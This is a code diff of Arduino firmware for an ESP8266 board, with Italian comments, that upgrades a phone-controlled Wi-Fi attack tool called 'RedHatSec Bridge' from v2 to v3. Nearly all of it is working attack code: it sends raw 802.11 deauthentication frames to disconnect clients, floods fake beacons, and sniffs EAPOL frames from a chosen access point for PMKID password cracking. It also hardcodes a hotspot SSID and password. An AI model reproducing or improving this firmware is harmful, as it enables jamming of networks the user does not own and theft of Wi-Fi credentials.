@@ -1,120 +1,70 @@
-// RedHatSec Bridge 8266 v2 — AP + protocollo RHS integrato (Wi-Fi recon/attack on-board)
+// RedHatSec Bridge 8266 v3 — STA-only, active scan async, TX buffered
 //
-//   iPhone --TCP:3333--> ESP8266: RHS framed protocol
-//     0x02 scan(sec)   → reti visibili [rssi][ch][bssid][sec][ssid]
-//     0x04 deauth(mac,ch,count) → TX raw deauth
-//     0x05 beacon(count,[len][ssid]..) → beacon spam
-//     0x06 pmkid(mac,ch) → capture EAPOL promiscua
-//     0x07 stop
+//   iPhone --TCP:3333--> ESP8266 (STA su hotspot iPhone)
 //
-// TX raw: wifi_send_pkt_freedom — compatibile esp8266 core 3.x (testato su 3.1.2)
-// e 2.x. Il TCP resta vivo perché l'AP è in WIFI_AP_STA: AP e STA coesistono.
+//   Protocollo RHS (frame TX esp→app):
+//     [0x5A][len_lo][len_hi][cmd][status][payload...][crc8(off1, 4+len)]
 //
-// Flash: Arduino IDE → board NodeMCU 1.0 / Wemos D1 mini → Upload.
+//   Protocollo RHS (frame RX app→esp):
+//     [0xA5][len_lo][len_hi][rsvd][cmd][payload...][crc8(off1, 4+len)]
+//
+//   Cmd:
+//     0x01 ping                         → "RHS-8266"
+//     0x02 scan[sec]                    → [rssi][ch][bssid6][sec][ssidlen][ssid]*
+//     0x04 deauth[mac6][ch][count]      → "deauth ok"
+//     0x05 beacon[count][len][ssid]...  → armato (loop in background)
+//     0x06 pmkid[mac6][ch]              → EAPOL raw (max 128B) o "no eapol"
+//     0x07 stop                         → ferma beacon + pmkid
+//
+// Note: ogni operazione che cambia canale (deauth, beacon, pmkid) spezza
+// momentaneamente lo STA. Il risultato viene bufferizzato e consegnato
+// al primo client TCP che si riconnette.
 
 #include <ESP8266WiFi.h>
 #include <user_interface.h>
 
-const char *AP_SSID  = "RHS-Bridge";
-const char *AP_PASS  = "redhatsec";
+// ============ CONFIG ============
+const char *STA_SSID = "Hexxeted";      // hotspot personale iPhone
+const char *STA_PASS = "lwae9180";    // ← cambia
 const uint16_t TCP_PORT = 3333;
 
+// ============ STATO ============
 WiFiServer server(TCP_PORT);
 WiFiClient client;
+
+uint8_t apChannel = 1;
 
 uint8_t rxBuf[512];
 int rxLen = 0;
 
+uint8_t txBuf[1100];
+int txLen = 0;
+bool txPending = false;
+
+bool scanPending = false;
+uint32_t scanStart = 0;
+
 bool beaconActive = false;
+uint8_t beaconSsids[16][33];
+int beaconSsidLens[16];
+int beaconCount = 0;
+uint8_t beaconChannel = 6;
+
 bool pmkidArmed = false;
 uint32_t pmkidStart = 0;
+uint32_t pmkidReturnAt = 0;
+bool pmkidAwaitingReturn = false;
 uint8_t pmkidTarget[6];
+uint8_t pmkidTargetCh = 1;
 uint8_t pmkidBuf[128];
 int pmkidLen = 0;
 bool pmkidCaptured = false;
 
-// ===== piano B: sniff passivo di beacons (metodo deauther) =====
-#define AP_CH 6
 struct APEntry { uint8_t bssid[6]; uint8_t ch; int8_t rssi; char ssid[33]; uint8_t sec; };
 APEntry aps[24];
 int apCount = 0;
-volatile bool sniffCollect = false;
-volatile uint8_t curCh = AP_CH;
 
-void beaconCb(uint8_t *buf, uint16_t len) {
-  if (!sniffCollect || len < 40) return;
-  uint8_t *d = buf;
-  int lim = (len > 180) ? 180 : len;
-  for (int i = 0; i + 40 <= lim; i++) {
-    // beacon: FC=0x80,00 + duration 00,00 (pattern byte-scan, SDK-agnostico)
-    if (d[i] == 0x80 && d[i + 1] == 0x00 && d[i + 2] == 0x00 && d[i + 3] == 0x00) {
-      uint8_t *bssid = d + i + 10;
-      int found = -1;
-      for (int k = 0; k < apCount; k++)
-        if (memcmp(aps[k].bssid, bssid, 6) == 0) { found = k; break; }
-      int slot = found;
-      if (slot < 0) {
-        if (apCount >= 24) return;
-        slot = apCount++;
-        memset(&aps[slot], 0, sizeof(APEntry));
-        memcpy(aps[slot].bssid, bssid, 6);
-        aps[slot].ch = curCh;
-      }
-      int8_t rssi = (int8_t)d[0];
-      if (rssi < -100) rssi = -100;
-      if (rssi > aps[slot].rssi) aps[slot].rssi = rssi;
-      // SSID IE: standard a payload+36, altrimenti cerca un tag 0x00 plausibile
-      for (int t = i + 36; t + 2 <= lim; t++) {
-        if (d[t] == 0x00 && d[t + 1] <= 32) {
-          uint8_t sl = d[t + 1];
-          if (t + 2 + sl <= lim) {
-            memcpy(aps[slot].ssid, d + t + 2, sl);
-            aps[slot].ssid[sl] = 0;
-          }
-          break;
-        }
-        if (d[t + 1] > 32) continue;
-      }
-      return;
-    }
-  }
-}
-
-void beaconScan(int seconds) {
-  apCount = 0;
-  wifi_promiscuous_enable(0);
-  wifi_set_promiscuous_rx_cb(beaconCb);
-  sniffCollect = true;
-  // hop tollerante al TCP: 3 canali non-AP, poi pausa sul canale AP (il link respira)
-  const uint8_t hops[] = {1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13};
-  int dwell = (seconds * 1000) / (12 + 4);
-  if (dwell < 180) dwell = 180;
-  for (int k = 0; k < 12; k += 3) {
-    for (int j = k; j < k + 3 && j < 12; j++) {
-      curCh = hops[j];
-      wifi_promiscuous_enable(0);
-      wifi_set_channel(curCh);
-      wifi_promiscuous_enable(1);
-      delay(dwell);
-    }
-    // pausa AP: beacon del nostro AP → client resta associato, TCP respira
-    curCh = AP_CH;
-    wifi_promiscuous_enable(0);
-    wifi_set_channel(AP_CH);
-    wifi_promiscuous_enable(1);
-    delay(dwell * 2);
-  }
-  sniffCollect = false;
-  wifi_set_channel(AP_CH);
-  wifi_promiscuous_enable(1);
-  Serial.printf("[scanB] %d AP raccolti\n", apCount);
-}
-
-uint8_t beaconSsids[16][33];
-int beaconSsidLens[16];
-int beaconCount = 0;
-
-// ===== crc8 (spec condivisa) =====
+// ============ crc8 ============
 uint8_t crc8(const uint8_t *d, int n) {
   uint8_t crc = 0;
   for (int i = 0; i < n; i++) {
@@ -125,7 +75,7 @@ uint8_t crc8(const uint8_t *d, int n) {
   return crc;
 }
 
-// ===== TX verso l'app (chunked notify a 20B, MTU-safe anche su TCP) =====
+// ============ TX con buffer offline ============
 void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len) {
   uint8_t f[1024];
   int i = 0;
@@ -137,44 +87,47 @@ void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len)
   if (len > 1000) len = 1000;
   if (len > 0) { memcpy(f + i, payload, len); i += len; }
   f[i++] = crc8(f + 1, 4 + len);
+
   if (client && client.connected()) {
     client.write(f, i);
     client.flush();
+  } else {
+    if (i <= (int)sizeof(txBuf)) {
+      memcpy(txBuf, f, i);
+      txLen = i;
+      txPending = true;
+    }
   }
-  Serial.printf("[TX] cmd=0x%02X status=0x%02X len=%d\n", cmdEcho, status, len);
+  Serial.printf("[TX] cmd=0x%02X st=0x%02X len=%d%s\n",
+                cmdEcho, status, len, (client && client.connected()) ? "" : " (buffered)");
 }
 
-// ===== RX dall'app =====
-void feedRx(const uint8_t *d, int n) {
-  for (int i = 0; i < n; i++) {
-    if (rxLen == 0 && d[i] != 0xA5) continue;
-    if (rxLen < (int)sizeof(rxBuf)) rxBuf[rxLen++] = d[i];
-    if (rxLen >= 6) {
-      int plen = rxBuf[1] | (rxBuf[2] << 8);
-      int total = 6 + plen;
-      if (rxLen >= total) {
-        uint8_t cmd = rxBuf[4];
-        if (crc8(rxBuf + 1, 4 + plen) == rxBuf[5 + plen]) {
-          dispatchCmd(cmd, rxBuf + 5, plen);
-        } else {
-          sendFrame(cmd, 0x01, (const uint8_t *)"crcerr", 6);
-        }
-        rxLen = 0;
-      }
+// ============ PMKID sniffer ============
+void snifferCb(uint8_t *buf, uint16_t len) {
+  if (!pmkidArmed || len < 40) return;
+  uint8_t *d = buf;
+  int lim = (len > 160) ? 160 : len;
+  for (int i = 0; i + 8 <= lim; i++) {
+    if (d[i] == 0xAA && d[i+1] == 0xAA && d[i+2] == 0x03 && d[i+3] == 0x00 &&
+        d[i+4] == 0x00 && d[i+5] == 0x00 && d[i+6] == 0x88 && d[i+7] == 0x8E) {
+      bool match = false;
+      for (int a = 4; a + 6 <= 36 && a + 6 <= len; a++)
+        if (memcmp(d + a, pmkidTarget, 6) == 0) { match = true; break; }
+      if (!match) return;
+      pmkidLen = (len < 128) ? len : 128;
+      memcpy(pmkidBuf, d, pmkidLen);
+      pmkidCaptured = true;
+      Serial.println("[pmkid] EAPOL");
+      return;
     }
   }
 }
 
-// ===== TX raw 802.11 =====
-// compatibile SDK2/SDK3: wifi_promiscuous_enable esiste in entrambi
-void radioChannel(uint8_t ch) {
-  wifi_promiscuous_enable(0);
-  wifi_set_channel(ch);
-  wifi_promiscuous_enable(1);
-}
-
+// ============ TX raw 802.11 ============
 void sendDeauth(const uint8_t bssid[6], uint8_t ch, int count) {
-  radioChannel(ch);
+  wifi_set_channel(ch);
+  delay(5);
+
   uint8_t pkt[26];
   pkt[0] = 0xC0; pkt[1] = 0x00;
   pkt[2] = 0x00; pkt[3] = 0x00;
@@ -187,6 +140,8 @@ void sendDeauth(const uint8_t bssid[6], uint8_t ch, int count) {
     wifi_send_pkt_freedom(pkt, 26, false);
     delay(8);
   }
+
+  wifi_set_channel(apChannel);
   Serial.printf("[deauth] %02X:%02X:%02X:%02X:%02X:%02X ch%d x%d\n",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ch, count);
 }
@@ -213,82 +168,123 @@ void buildBeacon(uint8_t *pkt, int *len, const uint8_t *ssid, int ssidLen,
 }
 
 void beaconLoop() {
-  uint8_t ch = 6;
-  radioChannel(ch);
   uint8_t pkt[128];
   for (int n = 0; n < beaconCount && beaconActive; n++) {
     uint8_t bssid[6] = {0x02, (uint8_t)random(256), (uint8_t)random(256),
                         (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)};
     int len = 0;
-    buildBeacon(pkt, &len, beaconSsids[n], beaconSsidLens[n], bssid, ch);
+    buildBeacon(pkt, &len, beaconSsids[n], beaconSsidLens[n], bssid, beaconChannel);
     for (int rep = 0; rep < 3; rep++) wifi_send_pkt_freedom(pkt, len, false);
     delay(40);
   }
 }
 
-// ===== PMKID sniffer (SDK-agnostico: byte-scan, nessuna struct interna) =====
-void snifferCb(uint8_t *buf, uint16_t len) {
-  if (!pmkidArmed || len < 40) return;
-  uint8_t *d = buf;
-  int lim = (len > 160) ? 160 : len;
-  for (int i = 0; i + 8 <= lim; i++) {
-    if (d[i] == 0xAA && d[i + 1] == 0xAA && d[i + 2] == 0x03 && d[i + 3] == 0x00 &&
-        d[i + 4] == 0x00 && d[i + 5] == 0x00 && d[i + 6] == 0x88 && d[i + 7] == 0x8E) {
-      // filtro AP: mac target presente nella zona addr del frame
-      bool match = false;
-      for (int a = 4; a + 6 <= 36 && a + 6 <= len; a++) {
-        if (memcmp(d + a, pmkidTarget, 6) == 0) { match = true; break; }
+// ============ scan ============
+void startScan(int seconds) {
+  if (seconds < 3) seconds = 3;
+  if (seconds > 12) seconds = 12;
+  if (scanPending) return;
+  WiFi.scanDelete();
+  if (WiFi.scanNetworks(true, true) == WIFI_SCAN_RUNNING) {
+    scanPending = true;
+    scanStart = millis();
+    Serial.println("[scan] started async");
+  }
+}
+
+void pollScan() {
+  if (!scanPending) return;
+  int n = WiFi.scanComplete();
+  if (n == WIFI_SCAN_RUNNING) {
+    if (millis() - scanStart > 15000) {
+      scanPending = false;
+      WiFi.scanDelete();
+      sendFrame(0x02, 0x02, (const uint8_t *)"scan timeout", 12);
+    }
+    return;
+  }
+  scanPending = false;
+  apCount = 0;
+  if (n > 0) {
+    for (int k = 0; k < n && apCount < 24; k++) {
+      APEntry &e = aps[apCount];
+      memset(&e, 0, sizeof(e));
+      e.rssi = (int8_t)WiFi.RSSI(k);
+      e.ch   = (uint8_t)WiFi.channel(k);
+      const uint8_t *b = WiFi.BSSID(k);
+      if (b) memcpy(e.bssid, b, 6);
+      e.sec  = (uint8_t)WiFi.encryptionType(k);
+      String s = WiFi.SSID(k);
+      int sl = s.length(); if (sl > 32) sl = 32;
+      memcpy(e.ssid, s.c_str(), sl); e.ssid[sl] = 0;
+      apCount++;
+    }
+  }
+  WiFi.scanDelete();
+
+  uint8_t payload[900];
+  int i = 0;
+  for (int k = 0; k < apCount && i < 880; k++) {
+    payload[i++] = (uint8_t)aps[k].rssi;
+    payload[i++] = aps[k].ch;
+    memcpy(payload + i, aps[k].bssid, 6); i += 6;
+    payload[i++] = aps[k].sec;
+    int sl = strlen(aps[k].ssid);
+    if (sl > 32) sl = 32;
+    payload[i++] = (uint8_t)sl;
+    memcpy(payload + i, aps[k].ssid, sl); i += sl;
+  }
+  Serial.printf("[scan] %d AP\n", apCount);
+  sendFrame(0x02, 0x00, payload, i);
+}
+
+// ============ RX parser ============
+void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen);
+
+void feedRx(const uint8_t *d, int n) {
+  for (int i = 0; i < n; i++) {
+    if (rxLen == 0 && d[i] != 0xA5) continue;
+    if (rxLen < (int)sizeof(rxBuf)) rxBuf[rxLen++] = d[i];
+    if (rxLen >= 6) {
+      int plen = rxBuf[1] | (rxBuf[2] << 8);
+      int total = 6 + plen;
+      if (rxLen >= total) {
+        uint8_t cmd = rxBuf[4];
+        if (crc8(rxBuf + 1, 4 + plen) == rxBuf[5 + plen]) {
+          dispatchCmd(cmd, rxBuf + 5, plen);
+        } else {
+          sendFrame(cmd, 0x01, (const uint8_t *)"crcerr", 6);
+        }
+        rxLen = 0;
       }
-      if (!match) return;
-      pmkidLen = (len < 128) ? len : 128;
-      memcpy(pmkidBuf, d, pmkidLen);
-      pmkidCaptured = true;
-      Serial.println("[pmkid] EAPOL catturato");
-      return;
     }
   }
 }
 
-// ===== dispatcher =====
+// ============ dispatcher ============
 void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
   Serial.printf("[RX] cmd=0x%02X plen=%d\n", cmd, plen);
   switch (cmd) {
-    case 0x01:  // ping
+    case 0x01:
       sendFrame(0x01, 0x00, (const uint8_t *)"RHS-8266", 8);
       break;
-    case 0x02: {  // scan — piano B: sniff passivo beacon con channel-hop
+
+    case 0x02: {
       int seconds = plen > 0 ? pl[0] : 8;
-      if (seconds < 3) seconds = 3;
-      if (seconds > 12) seconds = 12;
-      beaconScan(seconds);
-      uint8_t payload[900];
-      int i = 0;
-      for (int k = 0; k < apCount && i < 880; k++) {
-        payload[i++] = (uint8_t)aps[k].rssi;
-        payload[i++] = aps[k].ch;
-        memcpy(payload + i, aps[k].bssid, 6); i += 6;
-        payload[i++] = aps[k].sec;
-        int sl = (int)strlen(aps[k].ssid);
-        if (sl > 32) sl = 32;
-        payload[i++] = (uint8_t)sl;
-        memcpy(payload + i, aps[k].ssid, sl); i += sl;
-      }
-      // pausa di coda: il client si riassocia prima del frame di risposta
-      delay(300);
-      sendFrame(0x02, 0x00, payload, i);
+      startScan(seconds);
       break;
     }
-    case 0x04:  // deauth(mac6, ch, count)
+
+    case 0x04:
       if (plen >= 8) {
-        beaconActive = false;
         sendDeauth(pl, pl[6], pl[7]);
         sendFrame(0x04, 0x00, (const uint8_t *)"deauth ok", 9);
       } else {
         sendFrame(0x04, 0x02, (const uint8_t *)"bad args", 8);
       }
       break;
-    case 0x05: {  // beacon(count, [len][ssid]..)
-      beaconActive = false;
+
+    case 0x05: {
       int p = 0;
       int cnt = plen > 0 ? pl[p++] : 0;
       if (cnt > 16) cnt = 16;
@@ -301,59 +297,104 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
         beaconCount++;
         p += sl;
       }
-      beaconActive = beaconCount > 0;
-      Serial.printf("[beacon] armato x%d\n", beaconCount);
+      if (beaconCount > 0) {
+        wifi_set_channel(beaconChannel);
+        beaconActive = true;
+        Serial.printf("[beacon] armato x%d ch%d\n", beaconCount, beaconChannel);
+        sendFrame(0x05, 0x00, (const uint8_t *)"armed", 5);
+      } else {
+        sendFrame(0x05, 0x02, (const uint8_t *)"bad args", 8);
+      }
       break;
     }
-    case 0x06:  // pmkid(mac6, ch)
+
+    case 0x06:
       if (plen >= 7) {
         memcpy(pmkidTarget, pl, 6);
+        pmkidTargetCh = pl[6];
         pmkidCaptured = false;
         pmkidLen = 0;
         pmkidArmed = true;
         pmkidStart = millis();
-        radioChannel(pl[6]);
-        wifi_set_promiscuous_rx_cb(snifferCb);
-        Serial.println("[pmkid] armed");
+        wifi_set_channel(pmkidTargetCh);
+        delay(5);
+        wifi_promiscuous_enable(1);
+        Serial.printf("[pmkid] armed %02X:%02X:%02X:%02X:%02X:%02X ch%d\n",
+                      pmkidTarget[0], pmkidTarget[1], pmkidTarget[2],
+                      pmkidTarget[3], pmkidTarget[4], pmkidTarget[5], pmkidTargetCh);
+      } else {
+        sendFrame(0x06, 0x02, (const uint8_t *)"bad args", 8);
       }
       break;
-    case 0x07:  // stop
-      beaconActive = false;
-      pmkidArmed = false;
-      wifi_promiscuous_enable(0);
+
+    case 0x07:
+      if (beaconActive) {
+        beaconActive = false;
+        wifi_set_channel(apChannel);
+      }
+      if (pmkidArmed) {
+        pmkidArmed = false;
+        wifi_promiscuous_enable(0);
+        wifi_set_channel(apChannel);
+      }
       sendFrame(0x07, 0x00, (const uint8_t *)"stopped", 7);
       break;
+
     default:
       sendFrame(cmd, 0x03, (const uint8_t *)"unknown cmd", 11);
   }
 }
 
+// ============ setup ============
 void setup() {
   Serial.begin(115200);
   Serial.setDebugOutput(false);
   pinMode(2, OUTPUT);
   digitalWrite(2, LOW);
 
-  WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP(AP_SSID, AP_PASS, AP_CH);   // AP lockato su ch6: il ritorno dal hop è deterministico
-  wifi_promiscuous_enable(1);
+  WiFi.mode(WIFI_STA);
+  WiFi.setAutoReconnect(true);
+  WiFi.begin(STA_SSID, STA_PASS);
+  Serial.printf("[STA] connecting to %s\n", STA_SSID);
+
+  uint32_t t0 = millis();
+  while (WiFi.status() != WL_CONNECTED && millis() - t0 < 30000) delay(200);
+
+  if (WiFi.status() == WL_CONNECTED) {
+    apChannel = WiFi.channel();
+    Serial.printf("[STA] ok ip=%s ch=%d\n",
+                  WiFi.localIP().toString().c_str(), apChannel);
+  } else {
+    Serial.println("[STA] FAIL — il bridge parte lo stesso, ma TCP non raggiungibile");
+  }
+
+  wifi_set_promiscuous_rx_cb(snifferCb);
+  // promiscuo spento di default — si accende solo durante PMKID
 
   server.begin();
   server.setNoDelay(true);
-  Serial.printf("[RHS-8266 v2] AP '%s' ip %s :%u — protocollo RHS pronto\n",
-                AP_SSID, WiFi.softAPIP().toString().c_str(), TCP_PORT);
+  Serial.printf("[RHS-8266 v3] TCP :%u pronto\n", TCP_PORT);
 }
 
+// ============ loop ============
 void loop() {
+  // client TCP
   if (!client || !client.connected()) {
     if (client) client.stop();
     client = server.available();
     if (client) {
       client.setNoDelay(true);
-      Serial.println("[bridge] client TCP connesso");
+      Serial.printf("[bridge] client %s\n", client.remoteIP().toString().c_str());
+      if (txPending) {
+        client.write(txBuf, txLen);
+        client.flush();
+        txPending = false;
+        Serial.printf("[bridge] flush %d byte bufferizzati\n", txLen);
+      }
     }
   }
 
+  // RX
   int avail;
   while (client && client.connected() && (avail = client.available()) > 0) {
     uint8_t buf[128];
@@ -361,19 +402,33 @@ void loop() {
     if (n > 0) feedRx(buf, n);
   }
 
+  // scan async
+  pollScan();
+
+  // beacon spam
   if (beaconActive) beaconLoop();
 
+  // PMKID: timeout / capture → hop back
   if (pmkidArmed && (pmkidCaptured || millis() - pmkidStart > 25000)) {
     pmkidArmed = false;
     wifi_promiscuous_enable(0);
-    if (pmkidCaptured) sendFrame(0x06, 0x00, pmkidBuf, pmkidLen);
-    else sendFrame(0x06, 0x02, (const uint8_t *)"no eapol", 8);
+    wifi_set_channel(apChannel);
+    pmkidReturnAt = millis() + 3000;
+    pmkidAwaitingReturn = true;
+    Serial.println("[pmkid] return to AP channel");
   }
 
-  if (!client || !client.connected()) {
-    digitalWrite(2, (millis() / 800) % 2 ? LOW : HIGH);
-  } else {
+  if (pmkidAwaitingReturn && millis() >= pmkidReturnAt) {
+    pmkidAwaitingReturn = false;
+    if (pmkidCaptured) sendFrame(0x06, 0x00, pmkidBuf, pmkidLen);
+    else              sendFrame(0x06, 0x02, (const uint8_t *)"no eapol", 8);
+  }
+
+  // LED
+  if (client && client.connected()) {
     digitalWrite(2, LOW);
+  } else {
+    digitalWrite(2, (millis() / 600) % 2 ? LOW : HIGH);
   }
 
   delay(1);
